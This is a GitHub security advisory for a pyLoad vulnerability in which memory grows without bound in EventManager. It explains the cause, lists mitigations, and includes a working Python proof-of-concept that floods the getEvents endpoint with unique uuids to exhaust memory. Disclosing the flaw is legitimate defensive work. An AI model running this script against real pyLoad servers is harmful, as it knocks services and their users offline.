# [M] pyLoad: Unbounded Memory Growth Leading to DoS and Potential DDoS in EventManager

## Summary
Severity: Medium
Advisory: GHSA-c2f9-4mc8-j656
CVE: CVE-2026-48987
CWE: CWE-400, CWE-401, CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-09
Source: https://github.com/advisories/GHSA-c2f9-4mc8-j656
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0

## Details
## Description:
The `EventManager` module in `pyload` manages a list of `Client` instances for subscribing to events. The addition of each unique `uuid` from the `get_events` API causes the creation of a `Client` instance that gets appended to the `clients` list. Although there is a `clean()` method available in the `EventManager` module for removing non-responding `Client` instances, this method is never used in the `EventManager` or in the entire core application code. Consequently, this causes an uncontrolled growth in memory consumption until it becomes exhausted, resulting in a DoS attack.

## Vulnerable Code:
https://github.com/pyload/pyload/blob/355c3f8d78a91f72d049e58f1edee8a972f845eb/src/pyload/core/managers/event_manager.py#L16-L17

> Here the client is added to the `clients` list but never cleared the inactive clients.

## Exploitation:
1.  **Start pyLoad server** (Ensure the `pyload` server is running)
2.  **Authenticate**: Obtain a session cookie or an API key (Here i used the API key).
3.  **Send Requests**: Run the below poc script to send a large number of requests to the `getEvents` API endpoint, each with a unique `uuid`.
```python
import requests
import uuid
import time

# Configuration
URL = "http://localhost:8000/api/getEvents"
NUM_REQUESTS = 100000

headers = {
	"X-API-Key" : "<YOUR_APIKEY>"
}

print(f"Starting DoS attack: sending {NUM_REQUESTS} unique UUIDs...")

for i in range(NUM_REQUESTS):
   # Generating a new UUID
    uid = str(uuid.uuid4())
    try:
        # Sending request
        requests.get(URL, params={"uuid": uid}, headers=headers, timeout=5)
        if i % 1000 == 0:
            print(f"Sent {i} requests...")
    except requests.exceptions.RequestException as e:
        print(f"Error at request {i}: {e}")
        break

print("Attack complete. Check memory usage.")

```
5.  **Monitor Memory**: Monitor the memory usage of the `pyload` process (e.g., using `top`, `ps` or the following commands).
```bash
PID=$(pgrep -f "pyload"); while true; do ps -o rss= -p $PID; sleep 1; done
```

6.  **Observe Growth**: Notice that the memory consumption increases and never decreases, even after the requests stop and 30 seconds.

https://github.com/user-attachments/assets/28d460c9-655d-45a1-a47f-c0f4d196f686

## Impact:
- Denial of Service (DoS). The `pyload` process will consume all available system memory, leading to an Out-of-Memory (OOM) kill by the operating system or system-wide instability, affecting other services on the host.

## Mitigations:
- **Invoke `clean()`**: Call `self.clean()` at the beginning of the `get_events` method to purge inactive clients before processing new ones.
- **Rate Limiting**: Implement rate limiting on the `getEvents` endpoint to prevent a single client from flooding the server with unique UUIDs.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-c2f9-4mc8-j656
- https://github.com/pyload/pyload
